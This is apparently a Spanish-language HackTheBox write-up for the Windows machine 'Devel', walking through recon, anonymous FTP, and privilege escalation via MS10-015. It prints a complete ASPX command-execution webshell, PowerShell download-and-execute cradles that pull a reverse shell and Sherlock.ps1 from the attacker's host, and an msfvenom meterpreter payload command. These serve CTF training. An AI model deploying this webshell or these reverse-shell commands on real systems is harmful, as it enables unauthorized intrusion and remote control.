---
layout      : post
title       : "Devel - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Devel-HackTheBox/DEVEL.webp
category    : [ htb ]
tags        : [ Windows ]
---

En esta máquina Windows de nivel easy tocaremos un poco de todo, ftp, subiremos una webshell al servidor web, obtendremos una shell inversa, nos migraremos a una sesión en metasploit y escalaremos privilegios usando Sherlock y explotando una vulnerabilidad existente en el sistema que otorga privilegios.

🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)

![](/assets/images/HTB/Devel-HackTheBox/devel2.webp)

![](/assets/images/HTB/Devel-HackTheBox/devel-rating.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)


***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [FTP](#ftp).
3. [Explotación](#explotación).
4. [Escalada de Privilegios](#privesc).


***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Como de costumbre comienzo con el reconocimiento, pero antes de lanzar la utilidad nmap, lanzo el <span style="color:red"> script Whichsystem.py </span> que me sirve para identificar el sistema operativo de la máquina a la que me voy a enfrentar.

Esta heramienta creada por s4vitar se basa en el ttl (time to live) para identificar si es una máquina que corre un sistema operativo Linux o Windows.

| TTL    | Sistema Operativo | 
| :----- | :------- | 
| 64     | Linux    | 
| 128    | Windows  |

![](/assets/images/HTB/Devel-HackTheBox/whichsystem.webp)

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Una vez que ya se que me enfrento a una máquina Windows procedo a lanzar un escaneo simple de puertos con el fin de detectar los puertos abiertos en la máquina víctima.

Este escaneo de puertos lo realizo con la herramienta nmap.

![](/assets/images/HTB/Devel-HackTheBox/nmap1.webp)

Y como se puede ver solo hay dos puertos abiertos, el puerto 80 y el puerto 21.

Pero necesito algo más de información acerca de estos puertos, por lo que lanzo un escaneo un poco más avanzado a estos puertos abiertos encontrados.

![](/assets/images/HTB/Devel-HackTheBox/nmap2.webp)

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 21     | ftp      | Microsoft ftpd |
| 80     | http     | Microsoft IIS httpd 7.5 |

> Existe acceso anónimo configurado para el servicio ftp

Veo que hay varias cosas interesantes... asique voy a comenzar a enumerar y ojear por partes.

# FTP [#](FTP) {#FTP}

Como se puede apreciar en la salida del escaneo nmap podemos acceder al servicio ftp y autenticarnos como usuario anónimo con las credenciales anonymous:anonymous.

![](/assets/images/HTB/Devel-HackTheBox/ftp.webp)

Como se puede ver consigo acceso al servicio ftp y veo que hay 2 archivos y un directorio, en mi caso ya sé que esos archivos y ese directorio pertenencen a los del servidor web, ya que la página de inicio es iisstart.htm, que es propio del servicio IIS de Microsoft, por lo que de igual forma voy a mostrarlo.

# Explotación [#](explotación) {#explotación}

Si abro firefox y accedo a la dirección ip vemos lo siguiente.

![](/assets/images/HTB/Devel-HackTheBox/web1.webp)

A simple vista no hay nada relevante, pero si fuzzeo veremos lo siguiente.

![](/assets/images/HTB/Devel-HackTheBox/fuzz.webp)

Como se puede ver, nos saca el archivo welcome.png existente dentro del servicio ftp, lo que me dice que si subo un archivo desde ftp podré ejecutarlo desde el navegador.

De forma que subo una webshell al servidor para poder ejecutar comandos.

```c#
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
```

Esta webshell viene por defecto en la ruta `/usr/share/webshells/aspx/cmdasp.aspx`

A través del comando `put` desde ftp subo la webshell al servidor web.

![](/assets/images/HTB/Devel-HackTheBox/ftp2.webp)

Una vez lo subo accedo a la ruta donde he subido el archivo desde el navegador y compruebo que ya puedo ejecutar comandos.

![](/assets/images/HTB/Devel-HackTheBox/webshell.webp)

Ahora que ya puedo ejecutar comandos intento ejecutar una reverse shell one-line de Nishang (Invoke-PowershellTcp)

Lo primero que he de hacer es modificarla añadiendo mi ip y el puerto donde recibiré la reverse shell.

![](/assets/images/HTB/Devel-HackTheBox/rev1.webp)

Una vez editada abro un servidor python3 con el comando `python3 -m http.server 8081`.

Pongo un oyente de netcat en escucha en el puerto configurado en la reverse shell.

Y a través de la webshell ejecuto lo siguiente para descargar la reverse shell.

> powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8081/shell.ps1')"

![](/assets/images/HTB/Devel-HackTheBox/webshell123.webp)

Y obtengo acceso al sistema.

Ahora compruebo que tipo de privilegios tengo como el usuario `iis apppool`

![](/assets/images/HTB/Devel-HackTheBox/privilegios.webp)

En esta ocasión voy a intentar migrarme a una sesión de metasploit para poder usar una utilidad muy parecida a winpeas pero a través de un módulo de metasploit, por lo que he de crear un archivo malicioso con msfvenom de la siguiente forma.

```bash
# Crear archivo .exe malicioso.
------------------------------
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f exe > rev.exe
```

Una vez creado abro un servidor python3 en el directorio donde tengo el archivo .exe malicioso y desde la sesion de powershell de Windows a la que hemos ganado acceso anteriormente ejecuto el siguiente comando para pasar el archivo.

![](/assets/images/HTB/Devel-HackTheBox/rev2.webp)

Una vez tengo el archivo en la máquina vícitma me abro metasploit y usando el módulo multi/handler configuro los parámetros.

![](/assets/images/HTB/Devel-HackTheBox/msf1.webp)

Teniendo la sesión en escucha procedo a ejecutar el archivo .exe malicioso.

![](/assets/images/HTB/Devel-HackTheBox/ejecucion.webp)

Y conseguimos el acceso desde metasploit a través de meterpreter.

![](/assets/images/HTB/Devel-HackTheBox/metasploit.webp)

# Escalada de Privilegios [#](privesc) {#privesc}

Ahora para buscar alguna vulnerabilidad explotable y escalar privilegios voy a lanzar la herramienta Sherlock.ps1 que he de descargar desde su fuente oficial y pasar a la máquina vícitima.

[https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)

Para pasarlo lo descargo, abro un servidor python y ejecuto el siguiente comando desde la máquina víctima.

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8081/Sherlock.ps1'); Find-AllVulns
```

Ejecutamos el comando y se lanza la herramienta automáticamente buscando posibles vulnerabilidades de escalada en el sistema.

![](/assets/images/HTB/Devel-HackTheBox/priv-esc.webp)

Tenemos dos posibles vulnerabilidades, `MS10-015` y `MS10-092`.

Por lo que primero voy a probar con la primera, que buscando pude encontrar que tiene un módulo de mestasploit por lo que pongo la sesión en segundo plano desde el meterpreter usando el comando `background` y busco el módulo para explotar la vulnerabilidad.

![](/assets/images/HTB/Devel-HackTheBox/priv1.webp)

Ahora configuro los parámetros como anteriormente y le asigno la sesión adecuada, en mi caso es la número 20...

![](/assets/images/HTB/Devel-HackTheBox/priv2.webp)

Y lo ejecuto con el comando `exploit`

![](/assets/images/HTB/Devel-HackTheBox/system.webp)

Y ya soy usuario Administrador, por lo que puedo leer la flag user.txt y root.txt

![](/assets/images/HTB/Devel-HackTheBox/share.webp)











